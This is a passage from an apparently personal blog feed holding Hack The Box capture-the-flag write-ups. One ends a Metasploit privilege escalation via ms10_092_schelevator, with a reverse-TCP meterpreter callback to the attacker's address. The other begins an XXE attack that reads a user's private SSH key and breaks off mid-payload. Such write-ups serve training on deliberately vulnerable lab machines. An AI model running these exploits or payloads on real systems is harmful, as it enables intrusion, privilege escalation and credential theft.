&lt;p&gt;From here, we can use a few shell commands (the full list can be displayed by typing &lt;code class=&quot;highlighter-rouge&quot;&gt;help&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;?&lt;/code&gt;) or type &lt;code class=&quot;highlighter-rouge&quot;&gt;shell&lt;/code&gt; and dive into the classical Windows command prompt.&lt;/p&gt;

&lt;p&gt;I suggest you to play around with the available commands from &lt;strong&gt;meterpreter&lt;/strong&gt; and to get familiar with it.&lt;/p&gt;

&lt;p&gt;The following command will give you the user flag:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;C:/Users/merlin/Desktop/user.txt
e29ad8[...]2f44a2f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;The privilege escalation was very straight-forward for this box, especially with meterpreter.&lt;/p&gt;

&lt;p&gt;We will use a great module for lazy people, which is called: &lt;strong&gt;local_exploit_suggester&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;local-exploit-suggester&quot;&gt;Local Exploit Suggester&lt;/h3&gt;

&lt;p&gt;Back in our metepreter session, we can call this module with the following command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run post/multi/recon/local_exploit_suggester

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 10.10.10.93 - Collecting &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;exploits &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;x64/windows...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 10.10.10.93 - 10 exploit checks are being tried...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.10.93 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.10.93 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.10.93 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So many options! :smiling_imp:&lt;/p&gt;

&lt;p&gt;Let’s try the first one…&lt;/p&gt;

&lt;h3 id=&quot;ms10_092_schelevator&quot;&gt;ms10_092_schelevator&lt;/h3&gt;

&lt;p&gt;We can background our current &lt;strong&gt;meterpreter session&lt;/strong&gt; thanks to the command &lt;code class=&quot;highlighter-rouge&quot;&gt;background&lt;/code&gt; so we go back to &lt;strong&gt;msfconsole&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Then, we can tell Metasploit to use &lt;strong&gt;exploit/windows/local/ms10_092_schelevator&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/windows/local/ms10_092_schelevator
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; options

Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;exploit/windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name      Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   CMD                        no        Command to execute instead of a payload
   SESSION                    yes       The session to run this module on.
   TASKNAME                   no        A name &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the created task &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default random&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;


Exploit target:

   Id  Name
   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
   0   Windows Vista, 7, and 2008
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We specify the &lt;strong&gt;session number&lt;/strong&gt; to run this module on and the payload we want along with the local port to listen on for the reverse shell.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;We can’t use the same port as our previous reverse shell or no session will be created.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;SESSION 1   &lt;span class=&quot;c&quot;&gt;# The session number of our reverse shell (sessions -l to display them)&lt;/span&gt;
SESSION &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 1
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;PAYLOAD windows/x64/meterpreter/reverse_tcp   &lt;span class=&quot;c&quot;&gt;# If the exploit works, we want a new reverse shell&lt;/span&gt;
PAYLOAD &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; windows/x64/meterpreter/reverse_tcp
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LPORT 4445  &lt;span class=&quot;c&quot;&gt;# The local port to listen on&lt;/span&gt;
LPORT &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 4445
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST 10.10.13.75  &lt;span class=&quot;c&quot;&gt;# Ip address of our machine&lt;/span&gt;
LHOST &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.13.75
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, we can launch the exploit:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.13.75:4445
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Preparing payload at C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;EMP&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;IydYyMVXS.exe
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Creating task: sMVszFGn5xTj
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SUCCESS: The scheduled task &lt;span class=&quot;s2&quot;&gt;&quot;sMVszFGn5xTj&quot;&lt;/span&gt; has successfully been created.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SCHELEVATOR
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Reading the task file contents from C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;asks&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;MVszFGn5xTj...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Original CRC32: 0xa1c992cd
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Final CRC32: 0xa1c992cd
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Writing our modified content back...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Validating task: sMVszFGn5xTj
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Folder: &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; TaskName                                 Next Run Time          Status         
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;========================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;======================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===============&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; sMVszFGn5xTj                             11/1/2018 9:14:00 PM   Ready          
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SCHELEVATOR
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Disabling the task...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SUCCESS: The parameters of scheduled task &lt;span class=&quot;s2&quot;&gt;&quot;sMVszFGn5xTj&quot;&lt;/span&gt; have been changed.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SCHELEVATOR
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Enabling the task...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SUCCESS: The parameters of scheduled task &lt;span class=&quot;s2&quot;&gt;&quot;sMVszFGn5xTj&quot;&lt;/span&gt; have been changed.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SCHELEVATOR
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Executing the task...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Sending stage &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;206403 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to 10.10.10.93
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SUCCESS: Attempted to run the scheduled task &lt;span class=&quot;s2&quot;&gt;&quot;sMVszFGn5xTj&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SCHELEVATOR
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Deleting the task...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Meterpreter session 2 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.13.75:4445 -&amp;gt; 10.10.10.93:49162&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-10-28 20:14:13 +0100
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SUCCESS: The scheduled task &lt;span class=&quot;s2&quot;&gt;&quot;sMVszFGn5xTj&quot;&lt;/span&gt; was successfully deleted.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SCHELEVATOR

meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid&lt;/code&gt; command will confirm that the exploit worked:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; getuid
Server username: NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can now retrieve the &lt;strong&gt;root flag&lt;/strong&gt; the same way we did for the user:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;C:/Users/Administrator/Desktop/root.txt
c837f7b[...]f9d4f5ea
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://media3.giphy.com/media/g9582DNuQppxC/giphy.gif?cid=3640f6095bd60b65474c4d7255c34b91&quot; alt=&quot;Congratulations&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Et voilà!&lt;/p&gt;

&lt;h2 id=&quot;final-words&quot;&gt;Final Words&lt;/h2&gt;

&lt;p&gt;I hope it gave you a brief overview of the power of &lt;strong&gt;Metasploit Framework&lt;/strong&gt; and its ease of use. However, keep in mind that this tool will not help you to understand what is really happening on the machine.&lt;/p&gt;

&lt;p&gt;Do not hesitate to ask your questions if something remains unclear for you :relaxed:.&lt;/p&gt;
&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out. This machine was pretty easy so I’m going to take this opportunity to explain you the basics of the Metasploit framework.</summary></entry><entry><title type="html">HackTheBox: DevOops writeup</title><link href="http://localhost:4000/HackTheBox-DevOops.html" rel="alternate" type="text/html" title="HackTheBox: DevOops writeup" /><published>2018-10-10T10:00:00+02:00</published><updated>2018-10-10T10:00:00+02:00</updated><id>http://localhost:4000/HackTheBox-DevOops</id><content type="html" xml:base="http://localhost:4000/HackTheBox-DevOops.html">&lt;p&gt;Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-10/devoops-box.png&quot; alt=&quot;DevOops box&quot; title=&quot;DevOops Box&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this article, I’ll detail every step I’ve gone through in order to root the DevOops box, from the reconnaissance phase to the privilege escalation.
 &lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#recon&quot; id=&quot;markdown-toc-recon&quot;&gt;Recon&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#port-scanning&quot; id=&quot;markdown-toc-port-scanning&quot;&gt;Port scanning&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#web-application-mapping&quot; id=&quot;markdown-toc-web-application-mapping&quot;&gt;Web Application Mapping&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#from-xxe-to-user-access&quot; id=&quot;markdown-toc-from-xxe-to-user-access&quot;&gt;From XXE to User access&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#getting-root&quot; id=&quot;markdown-toc-getting-root&quot;&gt;Getting root&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#enumeration&quot; id=&quot;markdown-toc-enumeration&quot;&gt;Enumeration&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#sensitive-git-repository&quot; id=&quot;markdown-toc-sensitive-git-repository&quot;&gt;Sensitive git repository&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;

&lt;p&gt;The only information we get when starting a new box is the IP address of the machine. With experience, you’ll develop your own reconnaissance routine but I think that all of them start with the good old nmap port scanning.&lt;/p&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port scanning&lt;/h3&gt;

&lt;p&gt;Nmap is a very powerful tool offering a lot of features and options that can be a bit tricky to use for beginners. First, we will perform a fast scan of TCP open ports with OS and services version detection.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:/DevOops&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 10.10.10.91
    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    | ssh-hostkey:
    |   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    |   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    |_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    5000/tcp open  http    Gunicorn 19.7.1
    | http-methods:
    |_  Supported Methods: HEAD OPTIONS GET
    |_http-server-header: gunicorn/19.7.1
    |_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html; charset=utf-8).
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;In a future article dedicated to reconnaissance, I’ll show more Nmap commands that can be very useful in other contexts.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The scan output reveals &lt;strong&gt;ssh&lt;/strong&gt; on port 22 and an &lt;strong&gt;http server&lt;/strong&gt; listening on the non-standard port 5000. We also have service versions to keep in mind for an eventual exploit.&lt;/p&gt;

&lt;p&gt;Let’s investigate this Web application and come back to if we hit a deadend.&lt;/p&gt;

&lt;h2 id=&quot;web-application-mapping&quot;&gt;Web Application Mapping&lt;/h2&gt;

&lt;p&gt;First, reach this URL (http://10.10.10.91:5000) with a web browser.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-10/webapp.png&quot; alt=&quot;Website&quot; title=&quot;Website&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The page doesn’t show any link or dynamic content so let’s run &lt;strong&gt;dirb&lt;/strong&gt; in order to discover valid URLs.
Dirb is a web content scanner which bruteforces directories and files names on web servers.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:/DevOops&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dirb http://10.10.10.91:5000

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
DIRB v2.22    
By The Dark Raver
&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

START_TIME: Thu Oct 11 23:16:57 2018
URL_BASE: http://10.10.10.91:5000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

GENERATED WORDS: 4612                                                          

&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Scanning URL: http://10.10.10.91:5000/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+ http://10.10.10.91:5000/feed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:546263&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                               
+ http://10.10.10.91:5000/upload &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:347&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
END_TIME: Thu Oct 11 23:22:22 2018
DOWNLOADED: 4612 - FOUND: 2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Good news! Upload features are generally poorly secured inside web applications. Let’s visit this page!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-10/upload.png&quot; alt=&quot;Upload page&quot; title=&quot;Upload page&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;from-xxe-to-user-access&quot;&gt;From XXE to User access&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Xml eXternal Entities&lt;/strong&gt; is an exploit based on weakly configured XML parsers that allow arbitrary file reading on the webserver.&lt;/p&gt;

&lt;p&gt;Since this web application wants us to upload XML files, it seemed natural to me to test this vulnerability.&lt;/p&gt;

&lt;p&gt;I used the following payload:&lt;/p&gt;
&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!--?xml version=&quot;1.0&quot; ?--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY example &quot;Doe&quot;&amp;gt;&lt;/span&gt; ]&amp;gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Book&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Author&amp;gt;&lt;/span&gt;BoiteAKlou&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Author&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Subject&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;example;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Subject&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Content&amp;gt;&lt;/span&gt;Payload&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Content&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Book&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;And here is the output from the server:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PROCESSED BLOGPOST: Author: BoiteAKlou Subject: Doe Content: Payload URL for later reference: /uploads/test2.xml File path: /home/roosa/deploy/src&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We see that the Subject has been replaced by &lt;strong&gt;Doe&lt;/strong&gt; so the server is vulnerable.&lt;/p&gt;

&lt;p&gt;At this point, we can retrieve a bunch of interesting files or get &lt;strong&gt;roosa’s private ssh key&lt;/strong&gt; and then login via ssh.&lt;/p&gt;

&lt;p&gt;Here’s the payload I used:&lt;/p&gt;
&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!--?xml version=&quot;1.0&quot; ?--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo [
&amp;lt;!ELEMENT foo ANY&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///home/roosa/.ssh/id_rsa&quot; &amp;gt;&lt;/span&gt;]&amp;gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Book&amp;gt;&lt;/span&gt;
